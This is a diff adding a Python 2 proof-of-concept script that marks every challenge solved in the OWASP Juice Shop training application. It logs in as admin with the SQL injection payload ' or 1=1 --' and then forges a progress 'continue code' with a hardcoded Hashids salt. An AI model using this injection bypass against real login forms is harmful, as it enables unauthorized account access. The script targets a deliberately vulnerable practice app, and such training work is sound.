@@ -1,0 +1,143 @@
+#!/usr/bin/env python
+import requests, sys, json, time, argparse
+from hashids import Hashids
+
+def base_url_there_initial(url):
+    myResponse = requests.get(url)
+    return myResponse
+
+def getChallenge(id, field, jData):
+    iCounter = 0
+    for key in jData:
+        if key == 'data':
+            for subset in jData[key]:
+                iCounter = iCounter + 1
+                if iCounter == id:
+                    return str(subset[field])
+    else:
+        myResponse.raise_for_status()
+
+def solveThis(num, url):
+    if type(num) == int:
+        num = [num]
+    hashids = Hashids(salt="this is my salt", min_length=60)
+    token = loginAdmin()
+    headers = {"Authorization": "Bearer " + token}
+    try_url = base_url + "/rest/continue-code/apply/"+str(hashids.encode(*num))
+    s.put(try_url, headers=headers)
+    time.sleep(1)
+    jData = json.loads(s.get(url).content)
+    
+    return jData
+
+def loginAdmin():
+    url = base_url + "/rest/user/login"
+    params = {"email":"' or 1=1 --'",
+              "password":"notneeded"
+             } 
+    myResponse = s.post(url, params)
+    jData = json.loads(myResponse.content)
+    token = jData['authentication']['token']
+    return token
+
+def checkAllChallenges(solveList,jData):
+    countSuccess = 0
+    for challenge in solveList:
+        if str(getChallenge(challenge, "solved", jData)) == "True":
+            print bcolors.OKGREEN + "[SOLVED] "+ bcolors.ENDC + "Challenge " + str(challenge).zfill(2) + " (" + getChallenge(challenge, "name", jData) + ")"
+            countSuccess = countSuccess + 1
+        else:
+            print bcolors.FAIL + "[UNSOLVED] "+ bcolors.ENDC + "Challenge " + str(challenge).zfill(2) + " (" + getChallenge(challenge, "name", jData) + ")"
+
+    print "\nSummary: " + str(countSuccess) + "/" + str(num_challenges) + " challenges solved."
+    return
+
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
+#============[MAIN SESSION]
+print "OWASP Juice Shop cheater 0.1 PoC"
+parser = argparse.ArgumentParser()
+parser.add_argument("url", help="the full url of the OWASP Juice Shop")
+parser.add_argument("-check", help="check the current progress", action="store_true")
+parser.add_argument("-challenge", help="provide the number of the challenge to be solved", type=int)
+parser.add_argument("-all", help="solve all challenges in one run", action="store_true")
+args = parser.parse_args()
+
+base_url = args.url.strip("/")
+#Check to see if provided URL can be reached and is indeed for the OWASP Juice Shop
+if ("http://" not in args.url) and ("https://" not in args.url):
+    print "Provide a valid url for the OWASP Juice Shop starting with http:// or https://"
+    exit()
+else:
+    myResponse = base_url_there_initial(args.url)
+    if myResponse.status_code <> 200:
+        print "Provided URL could not be reached."
+        exit()    
+    else:
+        if "<title>OWASP Juice Shop</title>" not in myResponse.content:
+            print "Provided URL doesn't seem to be for the OWASP Juice Shop"
+            exit()
+        else:
+            print "[OK] OWASP Juice Shop found at provided URL"
+
+#From here on out use a session instead of requests
+s = requests.session()
+
+#Try to grab all the challenges using the shop's api:
+try:
+    url = base_url + "/Api/Challenges"
+    jData = json.loads(s.get(url).content)
+    num_challenges = len(jData['data'])
+    if num_challenges > 0:
+        print "[OK] Challenges found: {}".format(str(num_challenges))
+    else:
+        print "[ERR] No challenges found"
+except:
+    print "[ERR] Failed to get challenges, aborting.."
+    exit()
+
+print ""
+
+#Fill a list with id's of all the challenges:
+solveList = []
+for i in range (1, num_challenges+1):
+    solveList.append(i)
+
+#Perform different operations based on the option provided as argument:
+#Check progress argument:
+if args.check:
+    countSuccess = checkAllChallenges(solveList,jData)
+    exit()
+
+#Solve a specific challenge argument:
+elif args.challenge is not None:
+    if (args.challenge < 1) or (args.challenge > num_challenges):
+        print "Please provide a challenge between {} and {}".format('1',str(num_challenges))
+        exit()
+    else:
+        print "Trying to solve:"
+        print "Id          : " + getChallenge(args.challenge, "id", jData) 
+        print "Category    : " + getChallenge(args.challenge, "category", jData) 
+        print "Name        : " + getChallenge(args.challenge, "name", jData)
+        print "Description : " + getChallenge(args.challenge, "description", jData)
+               
+        if str(getChallenge(args.challenge, "solved", jData)) == "True":
+            print "Status      : {}".format(bcolors.OKGREEN + "Solved" + bcolors.ENDC)
+        else:
+            print "Status      : {}".format(bcolors.FAIL + "Unsolved" + bcolors.ENDC)
+        exit()
+
+#Solve all challenges argument:
+elif args.all:
+    print "Trying to solve all challenges at once:"
+    jData = solveThis(solveList, base_url + "/Api/Challenges")
+    countSuccess = checkAllChallenges(solveList,jData)
+    
